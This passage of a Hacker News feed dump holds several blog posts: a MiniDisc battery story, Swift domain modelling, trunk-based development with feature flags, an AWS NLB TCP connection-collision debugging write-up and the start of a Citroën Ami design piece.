<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-block-type="2" id="block-63a2566fbe2b2e25ec30"><div><p>Sony’s MiniDisc format has been a love affair since it first came out in the 90s. I purchased one as soon as I could afford it at a shop called Dixons close to where I lived in rural England. Since that first enthusiastic purchase, I’ve collected a few other player/recorders over the years and a healthy collection of discs.</p><p>Back in the day, using Sony’s SonicStage software to manage my collection was a pain. It was slow at the get go, and became increasingly choppy as tracks grew into the thousands. Rights management restrictions, imposed to stop folks from pirating perfect digital copies, were a nuisance. Yet, I loved that first MiniDisc player and the amazing little discs that slotted into it.</p><p>Two and a half decades later, I’ve added a few more MiniDisc devices and a lot more discs in my collection. My favorite is the Sony MZ-RH1, the last MiniDisc player/recorder Sony ever produced. It is sleek and sexy, sounds amazing, can record 34 hours of music onto a single disc, and is as much a work of art as a piece of electromechanical and electro-optical engineering can achieve. </p><p>Unfortunately, Sony doesn’t make the lithium ion batteries for this masterpiece anymore, and the one I have, which arrived with it packed in the box, no longer accepts a charge. A quick search on eBay brings up a few new “old stock” batteries to buy, but folks want $150+. </p><p>I needed a solution that didn’t induce sticker-shock…</p></div></div></div></div>]]>
            </description>
            <link>https://www.hallaminventions.com/projects/minidisc-obsession</link>
            <guid isPermaLink="false">hacker-news-small-sites-24857527</guid>
            <pubDate>Thu, 22 Oct 2020 13:02:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What can a pipe wrench teach us about software engineering?]]>
            </title>
            <description>
<![CDATA[
Score 74 | Comments 36 (<a href="https://news.ycombinator.com/item?id=24857224">thread link</a>) | @ingve
<br/>
October 22, 2020 | https://mokacoding.com/blog/pipe-wrench/ | <a href="https://web.archive.org/web/*/https://mokacoding.com/blog/pipe-wrench/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>What can a pipe wrench teach us about software engineering?
A lot, according to <a href="https://en.wikipedia.org/wiki/Vannevar_Bush">Vannevar Bush</a>.</p>
<p>An electrical engineer and professor at MIT, Bush was "one of the most politically powerful inventors in America since Benjamin Franklin," as his biographer <a href="https://geni.us/liVH8">G. Pascal Zachary puts it</a>.
During WWII, he personified the United State's military research, organized the Manhattan Project, and played a crucial role in the Allied victory.
He was also a mentor to <a href="https://en.wikipedia.org/wiki/Claude_Shannon">Claude Shannon</a>, the father of the information age.</p>
<p>One anecdote of Bush's career as an instructor at MIT particularly inspired me: his pipe wrench lecture.</p>
<p>Bush would greet an auditorium filled with aspiring engineers, hold up a pipe wrench, and challenge them: "Describe this".</p>
<p><img src="https://mokacoding.s3.amazonaws.com/2020-10-21-pipe-wrench.jpg" width="70%" alt="image of a pipe wrench"></p>
<p><i>Not the actual pipe wrench showed by Bush, I found this one on Amazon.</i></p>

<p>One by one, they would try, and each time Bush would dissect the description, pointing out where it was vague.</p>
<p>Finally, he would write in precise English a patent application for the wrench:</p>
<blockquote>
<p>By turning the nut to the right or left the movable jaw may be moved either toward or away from the fixed jaw, as may be desirable.
The inner face of the movable jaw is formed at a right angle to its shank, and is also provided with a series of teeth, which pitch or rake on its fellow jaw...</p>
</blockquote>
<p>With this exercise, Bush drilled into the class the value of precision.</p>
<h2 id="precision">Precision</h2>
<p>"Given the pipe wrench, produce the words for that wrench and no other; given the words, produce the wrench.
That, Bush taught his students, was the beginning of engineering", write Soni and Goodman in <a href="https://geni.us/FqRN7P"><em>A Mind at Play</em></a>.</p>
<p>Bush MIT students were electrical engineers, but precision is something software engineers should learn, too.</p>
<p>Precision is fundamental when representing building a model for the domain of the software in code.</p>
<p>One way in which a domain representation can be vague is when it allows inconsistent state to occur.
If you work in a language with a strong type system, like Swift, you can use precise types to make your domain modeling clearer and make undesirable state unrepresentable.</p>
<p>For example, when modeling an operation that can either succeed with some data or fail with an error, you could use a type like this:</p>
<pre><code><span><span>struct</span> <span>Operation</span> </span>{
  <span>let</span> success: <span>Bool</span>
  <span>let</span> data: <span>Data?</span>
  <span>let</span> error: <span>Error?</span>
}
</code></pre>
<p>This type does the job but leaves room for errors: nothing stops you from creating an instance with <code>success</code> true but <code>data</code> nil or one with values in both <code>data</code> and <code>error</code>.</p>
<pre><code><span>let</span> inconsistentOperation = <span>Operation</span>(success: <span>false</span>, data: someData, error: .<span>none</span>)
</code></pre>
<p>Using the <a href="https://developer.apple.com/documentation/swift/result"><code>Result</code> <code>enum</code></a>, you can remove this ambiguity <em>at compile time</em>, making it impossible for both data and error to be set simultaneously.</p>
<pre><code><span><span>struct</span> <span>Operation</span> </span>{
  <span>let</span> result: <span>Result</span>&lt;<span>Data</span>, <span>Error</span>&gt;
}
</code></pre>
<p>Another useful <code>enum</code>, borrowed from the <a href="https://elm-lang.org/">Elm programming language</a>, is <a href="https://github.com/mokagio/RemoteData"><code>RemoteData</code></a>: a way to encapsulate the state of a network operation.</p>
<pre><code><span><span>enum</span> <span>RemoteData</span>&lt;<span>T</span>&gt; </span>{
  <span>case</span> notAsked
  <span>case</span> loading
  <span>case</span> loaded(<span>T</span>)
  <span>case</span> failed(<span>Error</span>)
}
</code></pre>
<p><code>enum</code>s are not the only way tool to make your domain modeling more precise.
<a href="https://github.com/pointfreeco/swift-nonempty"><code>NonEmpty</code></a> uses <a href="https://docs.swift.org/swift-book/LanguageGuide/Generics.html#ID186">type constrained generics</a> to represent <code>Collection</code>s that are not empty.</p>
<pre><code>
<span>let</span> xs = <span>NonEmpty</span>&lt;[<span>Int</span>]&gt;(<span>1</span>, <span>2</span>, <span>3</span>, <span>4</span>)
xs.first + <span>1</span> 
</code></pre>
<p>Using <code>NonEmpty</code> adds clarity to the values you define, possibly avoiding runtime crashes by making it impossible to access via subscript an empty array.</p>
<p>If you had to represent "a collection of unique positive integers where order matters and with at least one element," you could use <code>[Int]</code>, or you could combine <code>NonEmpty</code>, <a href="https://github.com/Weebly/OrderedSet"><code>OrderedSet</code></a>, and <a href="https://developer.apple.com/documentation/swift/uint"><code>UInt</code></a> in <code>NonEmpty&lt;OrderedSet&lt;UInt&gt;&gt;</code>.</p>
<p>Using <code>[Int]</code> might be simpler but leaves the door open for all sorts of inconsistent instances, like an empty array, an array with negative values, or one with more than one occurrences of the same value.
<code>NonEmpty&lt;OrderedSet&lt;UInt&gt;&gt;</code> requires more work but using it will make the compiler help you avoid inconsistent state.</p>
<hr>
<p>We like to call ourselves software <em>engineers</em>, but sometimes forget that engineering is an applied science.
It is rigorous and methodical.
When building a bridge, an integrated circuit, or a motor, precision matters.
If the parts don't fit, if the power supply is not adequate, if there isn't enough material, things won't work.</p>
<p>With software, we're blessed with having a more malleable medium than our colleagues working in the physical realm.
That shouldn't be an excuse to forget the value of precision.</p>
<p>What are your favorite ways to use the type-system to implement a precise domain model?</p>
<p>Leave a comment below or get in touch on Twitter at <a href="https://twitter.com/mokagio">@mokagio</a>.</p>
</div></div>]]>
            </description>
            <link>https://mokacoding.com/blog/pipe-wrench/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24857224</guid>
            <pubDate>Thu, 22 Oct 2020 12:23:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Step-by-Step: Programming Incrementally]]>
            </title>
            <description>
<![CDATA[
Score 73 | Comments 11 (<a href="https://news.ycombinator.com/item?id=24857049">thread link</a>) | @pmarin
<br/>
October 22, 2020 | https://ourmachinery.com/post/step-by-step-programming-incrementally/ | <a href="https://web.archive.org/web/*/https://ourmachinery.com/post/step-by-step-programming-incrementally/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      <p>One thing that has really benefited my productivity (and also my general sanity), has been learning
how to take a big task and break it down into smaller, more manageable steps. Big tasks can be
frightening and overwhelming, but if I just keep working on the list of smaller tasks, then somehow,
as if by magic, the big task gets completed.</p>



<h2 id="adding-value">Adding value</h2>

<p>When programming, I take a very specific approach to this breakdown. I make sure that each step is
something that <em>compiles, runs, passes</em> all the tests<em>,</em> and <em>adds value</em> to the codebase<em>.</em> Exactly
what “adds value” means is purposefully left vague, but it can be things like adding a small
feature, fixing a bug, or taking a step towards refactoring the code into better shape (i.e.,
reducing <a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwikqYmb_6DsAhXSpZ4KHYm9BhgQFjAHegQIBxAC&amp;url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FTechnical_debt&amp;usg=AOvVaw1ZJ1dsWoB5Jn1hXvtLGuSZ">technical
debt</a>).</p>

<p>An example of <em>not</em> adding value is adding a new feature, but also introducing ten new bugs. It’s
not clear that the value of the feature outweighs the cost of the bugs, so it might be a net loss.</p>

<p>Another example of not adding value is making the UI prettier, but also make the app run ten times
slower. Again, it’s not clear that the prettier look is worth the performance hit, so it might be a
net loss.</p>

<p>Of course, I can’t always be sure that I’m not introducing bugs, and “value” is inherently
subjective (how much performance is a new feature worth). The important part is the <em>intention</em>. My
<em>intention</em> is to always add value with every single commit.</p>

<p>Basically, what I want to avoid is the “It has to get worse before it gets better”-attitude. Also
known as: “The new system is the modern way to do it. Sure, it has some bugs and runs kind of slow
right now, but once we’ve fixed that, it’s going to be way better than what we had before.” I’ve
seen too many cases where these supposed fixes never happen and the new system, which was supposed
to be better, just made things worse.</p>

<p>Plus, you know, it feels good to add value. If every day I can make a commit and that commit makes
the engine better in some way, that makes me happy.</p>

<h2 id="pushing-to-master">Pushing to master</h2>

<p>In addition to implementing changes through a series of small commits, I also <em>push every one of
those small commits back to the master branch.</em></p>

<p>Note that this is the exact opposite of a <a href="https://guides.github.com/introduction/flow/">feature
branch</a> workflow, instead, it is a form of
<a href="https://cloud.google.com/solutions/devops/devops-tech-trunk-based-development">trunk-based</a>
development:</p>

<ul>
<li><p>In a feature branch workflow developers work on new features in isolated, separate branches of the
code and don’t merge them back to master until they’re “complete”: fully working, debugged,
documented, code reviewed, etc.</p></li>

<li><p>In the trunk-based approach, features are implemented as a series of small individual commits to
the master branch itself. Care must be taken so that everything works even when the features are
only “partially implemented”:</p></li>
</ul>


<figure>
    
        <img src="https://ourmachinery.com/images/step__trunk-based-development.png">
    
    
    <figcaption>
        <h4>Trunk-based vs feature branch development.</h4>
        
    </figcaption>
    
</figure>


<p>Proponents of the feature branch approach claim that it is a safer way to work since changes to the
feature branch don’t disrupt the master and cause bugs. Personally, I think this safety is illusory.
Bugs in the feature branch just get hidden until it’s merged back to master when we suddenly get
<em>all</em> the bugs.</p>

<p>Feature branches also go against my philosophy that every commit should add value. The whole idea
behind a feature branch is: “we’re going to break a bunch of shit over here, but don’t worry, we’ll
fix it before we merge back to master”. Better not to break stuff in the first place.</p>

<p>Here are some other advantages I see with the trunk-based approach:</p>

<ul>
<li><p><strong>Fewer merge conflicts.</strong> With long-running feature branches, the code in the branch drifts
further and further away from the code in master, causing more and more merge conflicts. Dealing
with these is a lot of busy work for programmers and it also risks introducing bugs. Some of these
bugs won’t be seen until the branch is merged.</p></li>

<li><p><strong>Less release-day chaos.</strong> Typically, all features scheduled for a certain release have the same
deadline. This leads to all feature branches being merged just before the deadline. This means
that we get all the merge and integration bugs at the same time, just before the release date.
Getting a lot of bugs at the same time is a lot worse than having them spread out evenly. And
getting them just before a release is due is the absolute worst time to get them.</p></li>

<li><p><strong>No worry about the right time to merge.</strong> Since everybody knows that merging a feature branch
tends to cause instability, this leads to worry about the “right time” to merge. You want to avoid
merging right before a release (unless the feature is required for the release) to avoid
introducing bugs in the release. So maybe just after the release has been made? But what if we
need a hotfix for the release? While the merge is being held, valuable programmer time is being
wasted.</p></li>

<li><p><strong>No rush to merge.</strong> When working with feature branches, I often felt a hurriedness about getting
the branches merged. Sometimes because a branch was needed for a specific release. But also often
because the developer was tired of dealing with merge conflicts, wanted to get it over with, and
move on to the next thing. Thus, the goal of only merging feature branches when they are
“complete” was often compromised. (And of course, nothing is ever really “complete”.)</p></li>

<li><p><strong>Easier to revert.</strong> If major issues are discovered after the merge of a feature branch (which
often happens), there is often a lot of reluctance to revert the merge. Another big feature branch
might already have been merged on top of it (since lots of feature branches often get merged at
the same time, just before a release), and reverting it would cause total merge chaos. So instead
of doing a calm, sensible rollback, the team has to scramble desperately to fix the issues before
the release. With trunk-based development, any major issues would most likely have already been
discovered. The final commit that makes the new feature “go live” is typically a simple one-line
change that is painless to revert.</p></li>

<li><p><strong>Partial work is shared.</strong> In trunk-based development, the partial work done on a feature is seen
by all developers (in the master branch). Thus, everybody has a good idea of where the engine is
going. Bugs, design flaws, and other issues can be discovered early. And it is easier for others
to adapt their code to work with the new feature. It’s also easier to get an estimate of how much
work is needed to complete a feature when everybody can see how far it has progressed.</p></li>

<li><p><strong>Easier to pause and pick up later.</strong> Sometimes, work on a feature might have to be paused for a
variety of reasons. There might be more critical issues that need to be addressed. Or the main
developer of the feature might get sick, or have vacation coming up. This is a problem for feature
branches because they tend to “rot” over time, as the code base drifts further and further away,
causing more and more merge conflicts with the branch. Code that is checked into master does not
“rot” in the same way.</p></li>

<li><p><strong>Easier to address other bugs/refactors at the same time.</strong> When working on a feature or a
problem, it is pretty common to find other, related problems, exposed by the work you are doing.
In the trunk-based approach, this is not an issue. You would just make one or more separate
commits to the trunk to fix those issues. With the feature branch approach, it is more tricky. I
guess the <em>right</em> thing to do would be to branch off a new separate bug fix branch from master,
fix the issue in that branch, merge <em>that</em> branch into the branch you are currently working on,
and (once it passes code review) into master (so that other people get the bug fix before your
feature branch is merged, because who knows when that will happen). But who has time for all that
shit? So instead, people just fix the problem in their feature branch, and maybe cherry-pick it
into master if they’re having a good day. So now, instead of being about a single isolated
feature, the feature branch becomes a tangled mix of different features, bug fixes, and refactors.</p></li>
</ul>

<p>The main challenge of the trunk-based approach is how to break a big task down into individual
pieces. Especially, with the requirement that each piece should compile, run, add value, and be
ready to be pushed into master. How can we push partial work without exposing users to half-baked,
not yet fully working features?</p>

<p>Let’s look at some problems and how to solve them.</p>

<h2 id="problem-1-new-features">Problem #1: New features</h2>

<p>An approach that works well for new features is to use a flag to control whether a feature is
visible to end-users or not.</p>

<p>Let’s look at an example. A feature that I recently added to the engine was a <em>Download</em> tab that
lets the users download new engine versions and sample projects from within the engine itself:</p>


<figure>
    
        <img src="https://ourmachinery.com/images/step__download-tab.png">
    
    
    <figcaption>
        <h4>Download tab.</h4>
        
    </figcaption>
    
</figure>


<p>There are lots of different ways this could be broken down into smaller steps. Here’s an example:</p>

<ul>
<li>Add the <em>Download</em> tab to the menus and show a new blank tab when it’s opened.</li>
<li>Show a (hard-coded) list of things to download (without working download buttons).</li>
<li>Download the list of files from a server instead of having it hard-coded.</li>
<li>Implement the <code>[Get]</code> button by synchronously downloading the file when it’s clicked.</li>
<li>Switch to asynchronous, background downloading.</li>
<li>Show a progress bar for the download.</li>
<li>…</li>
</ul>

<p>Normally, I don’t do a full breakdown like this upfront. Instead, I just kind of figure out the next
logical step as I go along. I only sit down and do a serious planning session if the task is
particularly tricky and incremental steps like this don’t come naturally.</p>

<p>To prevent end-users from seeing the tab before it’s actually working, I hide it behind a flag. This
can be as simple as:</p>

<pre><code>const bool download_tab_enabled = false;

// ...

if (download_tab_enabled) {
    add_menu_item(tabs, "Download", open_download_tab);
}
</code></pre>

<p>To get the menu option to show the <em>Download</em> tab, you have to change the <code>download_tab_enabled</code>
flag to <code>true</code> and recompile.</p>

<p>We call these flags <a href="https://en.wikipedia.org/wiki/Feature_toggle"><em>feature flags</em></a> since they
selectively enable or disable …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ourmachinery.com/post/step-by-step-programming-incrementally/">https://ourmachinery.com/post/step-by-step-programming-incrementally/</a></em></p>]]>
            </description>
            <link>https://ourmachinery.com/post/step-by-step-programming-incrementally/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24857049</guid>
            <pubDate>Thu, 22 Oct 2020 11:55:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AWS NLBs and the mixed up TCP connections]]>
            </title>
            <description>
<![CDATA[
Score 175 | Comments 64 (<a href="https://news.ycombinator.com/item?id=24856607">thread link</a>) | @nielsole
<br/>
October 22, 2020 | https://www.niels-ole.com/cloud/aws/linux/2020/10/18/nlb-resets.html | <a href="https://web.archive.org/web/*/https://www.niels-ole.com/cloud/aws/linux/2020/10/18/nlb-resets.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <div>

  

  <article>
    <p>One of my services was running into timeouts, because connections were being reset by clients. 
I had assumed that it couldn’t be the <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/network/introduction.html">Network Load Balancers (NLBs)</a> fault, a battle-tested piece in the cloud stack.
The following is about NLBs, cross-zone-loadbalancing and multiple NLBs pointing to the same set of EC2 instances and how that revealed unexpected behaviour in the NLB.</p>

<p><strong>TLDR</strong>: If you don’t want timeouts or connection resets, then:</p>
<ul>
  <li>don’t use cross-zone loadbalancing</li>
  <li>don’t have multiple NLBs pointing at the same targets</li>
  <li>don’t use a public IPv4 address and an NLB for the same target</li>
</ul>

<h2 id="the-symptom-timeouts">The symptom: Timeouts</h2>

<p>My system was doing lots of requests to two NLBs over the internet.
Unfortunately in quite some cases there were timeouts in the application code.
The timeouts were quite aggressive at 1 second. Since a normal packet loss during connecting usually takes 3 seconds before a retry on linux, 
I initially explained it away as naturally occurring packet loss. 
But the number of failures grew ever higher with the link not even close to being saturated and other calls to external targets being fine.</p>

<p>When I finally got myself to take tcpdumps of the traffic, something strange emerged: TCP RST packets.</p>

<h2 id="the-setup-simplified">The Setup (simplified)</h2>

<p>The configuration in which these issues actually surfaced had multiple machines behind a NAT, talking to multiple EC2 instances behind two NLBs with cross-zone-loadbalancing enabled.</p>

<p>But that’s the messy reality, let’s keep it simple for this article. In the following let’s have 1 client, 1 NLB and 1 EC2 instance, because the issue would still be the same.
The NLB has cross-zone loadbalancing enabled.
<img src="https://www.niels-ole.com/assets/2020/nlb-basic.png" alt="An example of IPs used in the requests to an NLB"></p>

<h2 id="background">Background</h2>
<p>In TCP, connections are identified by the quadruple of source ip, source port, target ip and target port.
When you create a new TCP connection, it is made sure that no other connection with the same quadruple is in use.</p>

<h2 id="the-problem">The problem</h2>

<p>(Fast forward a couple of days of staring at tcpdump and head-scratching) 
Here is an excerpt of tcpdump as the client sees it, with all the noise removed:</p>

<div><div><pre><code>Format clientip:clientport &lt;-&gt; targetip:targetport (so a bit different than it looks in wireshark) 
... This connection has been established for some time
90.63.58.20:36230 &lt;- 34.242.162.234:443 Seq=1234 Ack=5432   [ACK]
</code></pre></div></div>

<p>EC2 instance (private IP) says through the NLB (34.242.162.234) to the client (90.63.58.20): <em>Hey, I just received your data, all is good.
This connection is healthy and sending data. Everything as expected.</em> 
Now our client wants to make a new connection and sends a SYN packet.</p>

<div><div><pre><code>90.63.58.20:36230 -&gt; 18.203.64.15:443   Seq=6951            [SYN]
</code></pre></div></div>

<p>As you notice, the source ports are identical, but this is fine, as the target IPs are different.
Next in the 3-way handshake of TCP we would expect a <code>[SYN,ACK]</code> with <code>Ack=6952</code></p>

<div><div><pre><code>90.63.58.20:36230 &lt;- 18.203.64.15:443 Seq=1234  Ack=5432    [ACK], window reduced
</code></pre></div></div>

<p>This packet has the same quadruple, but it isn’t our <code>[SYN,ACK]</code>… wait a sec. Where is this coming from? Does this ack belong on the other connection that the client had with <code>34.242.162.234</code>!?
The Ack numbers match, but that can’t be, can it?</p>

<p><img src="https://www.niels-ole.com/assets/2020/whatthehell.gif" alt="I was thinking: &quot;What the hell&quot;"></p>

<div><div><pre><code>90.63.58.20:36230 -&gt; 18.203.64.15:443 Seq=5432              [RST] 
</code></pre></div></div>
<p>Well, at least the client is as confused as I am and sends an RST. It just sucks that this means our SYN will never be properly answered.</p>

<p>Is the SYN of the new connection overwriting an existing connection in the NLB’s connection table?</p>

<h2 id="the-cause">The cause</h2>

<p>Since I had so much trust in AWS NLBs I first assumed the issue to lie somewhere (anywhere) else. 
I imagined it could theoretically be a faulty switch or a misconfigured NAT gateway on the client side.
But it turned out to be neither of them. It was actually the AWS NLB mixing up the connections.
How can this happen?</p>

<h3 id="cross-az-loadbalancing">Cross AZ-loadbalancing</h3>

<p>When the traffic goes through the NLBs the target IP address get rewritten to the internal IP address of the EC2 instance.</p>

<p><img src="https://www.niels-ole.com/assets/2020/nlb-basic.png" alt="An example of IPs used in the requests to an NLB"></p>

<p>Now how would it look from the client if three connections are created in a round-robin fashion?</p>

<div><div><pre><code>90.63.58.20:20536;34.242.162.234:443
90.63.58.20:36895;18.203.64.15:443
90.63.58.20:60356;52.203.250.3:443
</code></pre></div></div>

<p>Now this looks unproblematic, nice quadruples - no RST packets.
But what happens if we have more and longer-lived connections? Could collisions happen?</p>

<div><div><pre><code>...
90.63.58.20:36230;34.242.162.234:443 let's call this connection A
...
90.63.58.20:36230;18.203.64.15:443   and this one B
...
</code></pre></div></div>

<p>As I said in the background, the kernel ensures that there are no quadruple collisions.
And this is still the case in this case. The same source port can be reused, as long as the target ip or port are different. 
As the connections go to different IPs of the NLB, this is the case… but only from the view of the client.
In the NLB the addresses are translated to an internal IP.
So on the EC2 instance the quadruples look like this:</p>

<div><div><pre><code>...
90.63.58.20:36230;10.54.1.1:443 A
...
90.63.58.20:36230;10.54.1.1:443 B
...
</code></pre></div></div>

<p>Now this looks problematic. Two TCP connections share the same quadruple.
Thus the NLB cannot distinguish between them and sends the packets on either of them.</p>

<h2 id="is-this-a-bug">Is this a bug?</h2>

<p>An ordinary NAT would handle such collisions just fine. 
When a collision is detected, not only the address is translated but also the port.
This makes it possible to handle the complete port range before collisions occur.
NLBs apparently don’t act like NATs. I couldn’t find this spelled out anywhere, but apparently they always preserve the source port. 
This basically means that whenever a client makes more than <em>one</em> connection to the NLB, collisions may occur.
During my research I found out I am <a href="https://medium.com/swlh/nlb-connection-resets-109720accfc6">not the only one irritated by that</a> and that they opened a support ticket and got the confirmation that this is indeed intended behaviour.</p>

<p>In any case I don’t think anyone would derive this from <em>just</em> the docs and TCP knowledge.
There should at least be a big warning sign in <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/userguide/how-elastic-load-balancing-works.html">the documentation</a>.</p>

<h2 id="what-to-do-now">What to do now?</h2>

<p>This issue not only occurs with cross-zone-loadbalancing, but any time two external IPv4-addresses point to the same EC2 instance in AWS.
This includes multiple NLBs pointing at the same target or an instance having both a public IPv4 address and being behind an NLB.</p>

<p>What I take away from this is to never have two NLBs pointed at the same target groups as well as to turn cross-az loadbalancing off for most use-cases.
And never assume that a part of your stack is infallible.</p>

<p>Discuss on <a href="https://news.ycombinator.com/item?id=24856607">Hacker News</a> or <a href="https://www.reddit.com/r/devops/comments/jfxl9o/aws_nlbs_and_the_mixed_up_tcp_connections/">Reddit</a></p>

  </article>
  
  
</div>

      </div>
    </div></div>]]>
            </description>
            <link>https://www.niels-ole.com/cloud/aws/linux/2020/10/18/nlb-resets.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24856607</guid>
            <pubDate>Thu, 22 Oct 2020 10:37:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Citroën Ami and the future of urban transportation]]>
            </title>
            <description>
<![CDATA[
Score 97 | Comments 122 (<a href="https://news.ycombinator.com/item?id=24856541">thread link</a>) | @caskes
<br/>
October 22, 2020 | https://www.theturnsignalblog.com/blog/ami-and-future-of-transportation/ | <a href="https://web.archive.org/web/*/https://www.theturnsignalblog.com/blog/ami-and-future-of-transportation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>When</span> I saw the Ami for the first time I instantly fell in love. Citroën's tiny electric 'citadine' is smart, innovative, and well-designed. Seeing the first press cars zip through the wide boulevards of Paris brought a big smile to my face. But the more I kept thinking about it, the more I started to doubt the purpose of this car. </p>

<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/260ced86352d8a0a2392c56e7aaebcbe/040c5/amioverview.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="The Citroën Ami" title="The Citroën Ami" src="https://www.theturnsignalblog.com/static/260ced86352d8a0a2392c56e7aaebcbe/a8fee/amioverview.jpg" srcset="https://www.theturnsignalblog.com/static/260ced86352d8a0a2392c56e7aaebcbe/35027/amioverview.jpg 180w,
https://www.theturnsignalblog.com/static/260ced86352d8a0a2392c56e7aaebcbe/627a5/amioverview.jpg 360w,
https://www.theturnsignalblog.com/static/260ced86352d8a0a2392c56e7aaebcbe/a8fee/amioverview.jpg 720w,
https://www.theturnsignalblog.com/static/260ced86352d8a0a2392c56e7aaebcbe/b2ead/amioverview.jpg 1080w,
https://www.theturnsignalblog.com/static/260ced86352d8a0a2392c56e7aaebcbe/040c5/amioverview.jpg 1200w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The Citroën Ami</figcaption>
  </figure> 
<p>The Ami started life as the AMI ONE C Concept which was a study on new ways to overcome the challenges of designing a small, affordable city car. The two biggest challenges are how to create as much interior space as possible and how to keep the production costs low. Many of the ideas of the concept car have found their way to the Ami production model.</p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/258806b8ec0a0cc4b335ff7ec371e7a1/533d0/onec.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="The Citroën AMI ONE C Concept was presented at the 2019 Geneva Motor Show" title="The Citroën AMI ONE C Concept was presented at the 2019 Geneva Motor Show" src="https://www.theturnsignalblog.com/static/258806b8ec0a0cc4b335ff7ec371e7a1/a8fee/onec.jpg" srcset="https://www.theturnsignalblog.com/static/258806b8ec0a0cc4b335ff7ec371e7a1/35027/onec.jpg 180w,
https://www.theturnsignalblog.com/static/258806b8ec0a0cc4b335ff7ec371e7a1/627a5/onec.jpg 360w,
https://www.theturnsignalblog.com/static/258806b8ec0a0cc4b335ff7ec371e7a1/a8fee/onec.jpg 720w,
https://www.theturnsignalblog.com/static/258806b8ec0a0cc4b335ff7ec371e7a1/b2ead/onec.jpg 1080w,
https://www.theturnsignalblog.com/static/258806b8ec0a0cc4b335ff7ec371e7a1/533d0/onec.jpg 1280w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The Citroën AMI ONE C Concept was presented at the 2019 Geneva Motor Show</figcaption>
  </figure>
<h2>Cost Saving</h2>
<p>The 'usual' cost-saving recipe when creating affordable city cars is to share a production line with other manufacturers. The drawback is that these manufacturers are selling the same car with slightly different design details. </p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/352b9be3593cda9bb8f5f4e9fc46fd0f/0f117/similarcars.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="The Peugeot 107, Citroën C1, and Toyota Aygo share the same production line" title="The Peugeot 107, Citroën C1, and Toyota Aygo share the same production line" src="https://www.theturnsignalblog.com/static/352b9be3593cda9bb8f5f4e9fc46fd0f/b85f6/similarcars.png" srcset="https://www.theturnsignalblog.com/static/352b9be3593cda9bb8f5f4e9fc46fd0f/aaa28/similarcars.png 180w,
https://www.theturnsignalblog.com/static/352b9be3593cda9bb8f5f4e9fc46fd0f/7e1e1/similarcars.png 360w,
https://www.theturnsignalblog.com/static/352b9be3593cda9bb8f5f4e9fc46fd0f/b85f6/similarcars.png 720w,
https://www.theturnsignalblog.com/static/352b9be3593cda9bb8f5f4e9fc46fd0f/4d206/similarcars.png 1080w,
https://www.theturnsignalblog.com/static/352b9be3593cda9bb8f5f4e9fc46fd0f/91a72/similarcars.png 1440w,
https://www.theturnsignalblog.com/static/352b9be3593cda9bb8f5f4e9fc46fd0f/0f117/similarcars.png 1593w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The Peugeot 107, Citroën C1, and Toyota Aygo share the same production line</figcaption>
  </figure>
<p>Citroën took a different approach. Instead of sharing a production line, they have come up with ways to create the simplest production line. This limits the variety of the design but instead of trying to hide that, the Ami highlights these limitations.
The clearest example is the exterior bodywork. As you can see from the video below, the exterior is largely made up of only three different bodywork panels.</p>
<video autoplay="" loop="" muted="" playsinline="">  
  <source src="https://www.theturnsignalblog.com/d33ec155f42d337c79d048fb5cec2610/ami.webm" type="video/webm">  
  <source src="https://www.theturnsignalblog.com/8395c6a14cb9a9fa45af5c3129d86bbf/ami.mp4" type="video/mp4">
</video> 
<p>This gives it its quirky look as from far away the car does not seem to have a clear front or backside. The doors have a similar effect. Because they are identical,  they open in opposite directions from each other. Instead of trying to hide these limitations, Citroën shows them off in ads and commercials, celebrating the quirkiness of the car.</p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/2bddb5921a8d1164184e7aa4ab8fa948/1ca3f/doors.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="The doors open in opposite directions" title="The doors open in opposite directions" src="https://www.theturnsignalblog.com/static/2bddb5921a8d1164184e7aa4ab8fa948/a8fee/doors.jpg" srcset="https://www.theturnsignalblog.com/static/2bddb5921a8d1164184e7aa4ab8fa948/35027/doors.jpg 180w,
https://www.theturnsignalblog.com/static/2bddb5921a8d1164184e7aa4ab8fa948/627a5/doors.jpg 360w,
https://www.theturnsignalblog.com/static/2bddb5921a8d1164184e7aa4ab8fa948/a8fee/doors.jpg 720w,
https://www.theturnsignalblog.com/static/2bddb5921a8d1164184e7aa4ab8fa948/b2ead/doors.jpg 1080w,
https://www.theturnsignalblog.com/static/2bddb5921a8d1164184e7aa4ab8fa948/aed33/doors.jpg 1440w,
https://www.theturnsignalblog.com/static/2bddb5921a8d1164184e7aa4ab8fa948/1ca3f/doors.jpg 1920w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The doors open in opposite directions</figcaption>
  </figure>
